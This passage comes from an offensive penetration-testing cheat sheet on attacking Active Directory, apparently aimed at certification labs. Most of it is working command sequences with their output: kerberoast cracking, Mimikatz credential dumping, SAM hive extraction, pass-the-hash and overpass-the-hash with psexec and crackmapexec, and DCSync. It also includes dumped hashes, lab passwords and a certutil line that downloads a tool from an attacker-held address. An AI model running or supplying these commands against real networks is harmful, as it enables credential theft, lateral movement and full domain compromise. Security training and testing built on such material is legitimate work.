98FB2594F293E7781768CAFDF3E21B8110A547F84FBD2C8A4A47D1593F125B458151B67B29CF15468B4B09B15664C5812ABF539676BD7DF2CA6F83670463F2492D08775896A45404EFC35D024F1CBF6C6EC2FC4639749B308B63C41D6F310BC681EB819253EB8A1967F2C2109D2EAE2AC1E87A3D42D47742BC89590EA7D67662BA4E8F1BC7C97FC3F9CC642DF2FE9B3AE4A307088DEC1B60C55088FB2B900C199EBAF7025E14EA538D511CBCF6EC694F8349B7A11513E00AFED4666EB953A82CA25361AD72369D87DAFB6DDA8B20858B20906F408A83032FF509E40125F58A297EAC10C8B022494A1A9D1D9C6A65A971E9D3DAE7A3E530CDBB7EB3D509A77AC3487B4C55635B0926F3E1878303256F1B0EECB3B577DC30DE9678C87E87DD738B2C773265718E81D3D7FBA67D6200908A45670ED8CAF2B05F21BC7B678F7E137867986D4642316DDCDA2A9C657E6BE9417FD98634E3A03D8FEE59B1080A0F2D02613EFB5D0F978920278D00347367913928D47F59ACBFF26D0E524F50C4F5D36519EDE6E4D461AC6CF04CA1717B755FF2D7049480698E4A46C0C9F2BCB62847BF5A4463EE1632F86BD96326E3098387DA373F8DF8539B274659FE37AFF1B3AB624A2F91961E23527959049A4AF882EC4CA5271A04B466D1C56DC5C17EAB47D942510CDC18346E03BF5CDBD8A534BF8333C0A6D777FA16566E4A3D738BF00B16F28AC64A738E631A68E633725448FE35FC53429CF6CC96ED8556F8C20B24E690D7CFB08CEBD6BFF04CEDA70977048E0761847378446FB060E5B5
````
##### Crack the tickets in your local kali 
````
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
#13100	Kerberos 5, etype 23, TGS-REP
````
##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
or
https://github.com/allandev5959/mimikatz-2.1.1
````
````
unzip mimikatz_trunk.zip 
````
````
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
````
````
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
To download the service ticket with Mimikatz, we use the kerberos::list command, which yields the equivalent output of the klist command above. We also specify the /export flag to download to disk as shown in Listing 33.
````
kerberos::list /export
`````
##### kerberoast Exploitation
````
sudo apt update && sudo apt install kerberoast
````
````
python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
````
````
rdesktop -u 'Allison' -p 'RockYou!' 192.168.129.59 -g 94% -d OFFSEC
````
##### Powershell
This lists current cached tickets
````
klist
````
#### Credential Dumping SAM
SAM is short for the Security Account Manager which manages all the user accounts and their passwords. It acts as a database. All the passwords are hashed and then stored SAM. It is the responsibility of LSA (Local Security Authority) to verify user login by matching the passwords with the database maintained in SAM. SAM starts running in the background as soon as the Windows boots up. SAM is found in C:\Windows\System32\config and passwords that are hashed and saved in SAM can found in the registry, just open the Registry Editor and navigate yourself to HKEY_LOCAL_MACHINE\SAM.
````
whoami /all #BUILTIN\Administrators
````
````
#cmd.exe
reg save hklm\sam c:\sam
reg save hklm\system c:\system
````
````
secretsdump.py -sam sam -system system local
````
````
cat hashes.sam    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
hacker:1006:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
````
````
python3 /home/kali/Downloads/impacket-0.9.20/examples/secretsdump.py 'OFFSEC/Allison:RockYou!@192.168.129.59'
systeminfo #DC01
````
### Active Directory Lateral Movement <img src="https://cdn-icons-png.flaticon.com/512/9760/9760046.png" width="40" height="40" />
#### Direction
##### Finding Machines
````
nslookup #use this tool to internally find the next computer to pivot to.
xor-app23.xor.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
Address: 10.11.1.121
````
##### Checking credentials
````
crackmapexec smb 10.11.1.120-124 -u Daisy -p XorPasswordIsDead17 -d xor.com -x whoami #change smb to other services
crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
````
#### Pass the Hash <img src="https://cdn-icons-png.flaticon.com/128/6107/6107027.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/6050/6050858.png" width="40" height="40" />
The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
##### third party cheat sheet
````
https://juggernaut-sec.com/pass-the-hash-attacks/
````
#### Commands
````
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.129.59
psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded940e1f2bcf5eea4b8dbf6
````
##### Exploitation chain
###### mimikatz.exe
````
privilege::debug
sekurlsa::logonpasswords
````
````
Authentication Id : 0 ; 206403 (00000000:00032643)
Session           : Interactive from 1
User Name         : tris
Domain            : svcorp
Logon Server      : SV-DC01
Logon Time        : 3/24/2022 3:59:41 PM
SID               : S-1-5-21-466546139-763938477-1796994327-1124
        msv :
         [00000003] Primary
         * Username : tris
         * Domain   : svcorp
         * NTLM     : 08df3c73ded940e1f2bcf5eea4b8dbf6
         * SHA1     : b6e8eb6ec416d510bd082d72d687b2f41d6b5dc3
         * DPAPI    : 2800a2930c81ce49f9cc565282754433
        tspkg :
        wdigest :
         * Username : tris
         * Domain   : svcorp
         * Password : (null)
        kerberos :
         * Username : tris
         * Domain   : SVCORP.COM
         * Password : (null)
        ssp :
        credman :

````
###### cme
`````
crackmapexec smb 10.11.1.20-24 -u tris -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svcorp.com -x whoami
`````
###### foothold
````
psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded940e1f2bcf5eea4b8dbf6
````
#### Overpass the Hash <img src="https://cdn-icons-png.flaticon.com/128/9513/9513588.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/5584/5584500.png" width="40" height="40" /> 
##### Intro
With overpass the hash,1 we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
##### Pre-req
````
In this technique we have to first get system access and follow the adding a user with high privs guides!
Once the that guide in our cheat sheet is done come back to this. We are going from .24 to .21 in this guide
````
##### Exploitation mimikatz
````
privilege::debug
sekurlsa::logonpasswords
````
###### Results
````
Authentication Id : 0 ; 1822926 (00000000:001bd0ce)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/04/2023 23:45:17
SID               : S-1-5-18
        msv :
         [00000003] Primary
         * Username : pete
         * Domain   : svcorp.com
         * NTLM     : 0f951bc4fdc5dfcd148161420b9c6207
        tspkg :
        wdigest :
         * Username : pete
         * Domain   : svcorp.com
         * Password : (null)
        kerberos :
         * Username : pete
         * Domain   : svcorp.com
         * Password : (null)
        ssp :
        credman :
````
##### Exploitation
````
sekurlsa::pth /user:pete /domain:svcorp.com /ntlm:0f951bc4fdc5dfcd148161420b9c6207 /run:PowerShell.exe
#this should spawn a new shell
````
##### Checking for lateral movement
````
crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
````
###### Results
````
crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
SMB         10.11.1.21      445    SV-FILE01        [*] Windows Server 2016 Standard 14393 x64 (name:SV-FILE01) (domain:svcorp.com) (signing:False) (SMBv1:True)
SMB         10.11.1.24      445    SVCLIENT73       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT73) (domain:svcorp.com) (signing:False) (SMBv1:True)
SMB         10.11.1.22      445    SVCLIENT08       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT08) (domain:svcorp.com) (signing:False) (SMBv1:True)
SMB         10.11.1.20      445    SV-DC01          [*] Windows 10.0 Build 17763 x64 (name:SV-DC01) (domain:svcorp.com) (signing:True) (SMBv1:False)
SMB         10.11.1.21      445    SV-FILE01        [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 (Pwn3d!)
SMB         10.11.1.24      445    SVCLIENT73       [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 
SMB         10.11.1.22      445    SVCLIENT08       [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 
SMB         10.11.1.21      445    SV-FILE01        [+] Executed command 
SMB         10.11.1.21      445    SV-FILE01        svcorp\pete
SMB         10.11.1.20      445    SV-DC01          [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207
````
##### Moving to next target
````
PS> klist # should show no TGT/TGS
PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by authN to network share on the computer
PS> klist # now should show TGT/TGS
PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
````
###### Results
````
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.11.1.21
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.11.0.1

Tunnel adapter isatap.{EA29B022-A71B-48E3-9746-0A3B38A4777C}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

C:\Windows\system32>whoami
svcorp\pete

C:\Windows\system32>
````

#### Pass the Ticket <img src="https://cdn-icons-png.flaticon.com/128/6009/6009553.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/3851/3851423.png" width="40" height="40" />
We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility. The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
#### Silver Ticket <img src="https://cdn-icons-png.flaticon.com/512/3702/3702979.png" width="40" height="40" />
However, with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource with any permissions we desire. This custom-created ticket is known as a silver ticket1 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all. Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) kerberos::golden2 command. We will explain this apparent misnaming later in the module.
#### Distributed Component Object Model (DCOM) <img src="https://cdn-icons-png.flaticon.com/128/1913/1913653.png" width="40" height="40" />
The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network. DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook7 as well as PowerPoint.8 Since this requires the presence of Microsoft Office on the target computer, this lateral movement technique is best leveraged against workstations.
#### Golden Ticket <img src="https://cdn-icons-png.flaticon.com/128/7505/7505544.png" width="40" height="40" /> 
Going back to the explanation of Kerberos authentication, we recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt.1

If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or golden tickets. t this stage of the engagement, we should have access to an account that is a member of the Domain Admins group or we have compromised the domain controller itself. With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.
#### Domain Controller Synchronization <img src="https://cdn-icons-png.flaticon.com/128/9405/9405206.png" width="40" height="40" /> 
To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
````
lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
lsadump::dcsync /user:zensvc #Pick a user with admin rights to crack the password or pass the hash
````
````
Credentials:
  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
````
````
impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zensvc@192.168.183.170
````
